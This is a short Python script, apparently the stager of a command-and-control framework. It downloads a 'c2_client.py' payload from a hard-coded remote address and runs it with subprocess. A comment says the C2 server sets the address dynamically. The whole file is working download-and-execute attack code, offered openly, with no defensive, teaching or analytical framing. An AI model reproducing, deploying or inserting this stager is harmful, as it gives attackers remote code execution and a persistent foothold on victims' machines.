import urllib.request
import os
import subprocess

# URL to download the c2_client.py payload
PAYLOAD_URL = 'http://1.1.1.1/c2_client.py'  # Ensure you leave this as c2_server sets it dynamically
PAYLOAD_FILENAME = 'c2_client.py'

def download_payload(url, filename):
    try:
        print("[*] Downloading payload...")
        urllib.request.urlretrieve(url, filename)
        print(f"[*] Payload downloaded as {filename}")
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e.reason}")
    except Exception as e:
        print(f"[!] Failed to download payload: {e}")

def execute_payload(filename):
    try:
        if os.path.isfile(filename):
            print("[*] Executing payload...")
            result = subprocess.run(['python', filename], capture_output=True, text=True)
            print(f"[*] Payload output:\n{result.stdout}")
            if result.stderr:
                print(f"[!] Payload error output:\n{result.stderr}")
        else:
            print(f"[!] Payload file does not exist: {filename}")
    except Exception as e:
        print(f"[!] Failed to execute payload: {e}")

if __name__ == "__main__":
    download_payload(PAYLOAD_URL, PAYLOAD_FILENAME)
    execute_payload(PAYLOAD_FILENAME)
